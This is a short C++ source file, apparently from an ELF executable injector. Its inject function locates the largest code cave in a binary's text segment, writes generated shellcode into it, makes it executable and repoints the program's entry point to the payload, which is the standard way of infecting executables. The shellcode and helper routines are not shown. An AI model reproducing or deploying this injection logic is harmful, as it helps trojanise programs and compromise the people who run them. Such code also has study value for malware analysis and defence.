#include "inject.hpp"
#include "elf_handler.hpp"
#include <iostream>

namespace injector {

void inject(Elf_target &elf) {
  const auto code_cave = elf.find_biggest_code_cave();
  const auto new_entry_point = elf.get_text_segment_offset() + code_cave.offset;
  const auto shellcode = shellcode::make_shellcode(
      new_entry_point - elf.entry_point());

  if (code_cave.size < shellcode.size()) {
    throw std::runtime_error { "can't find a big enough code cave" };
  }

  elf.write_shellcode(shellcode, code_cave);
  elf.set_executable(new_entry_point);

  elf.change_entry_point(new_entry_point);
}

}
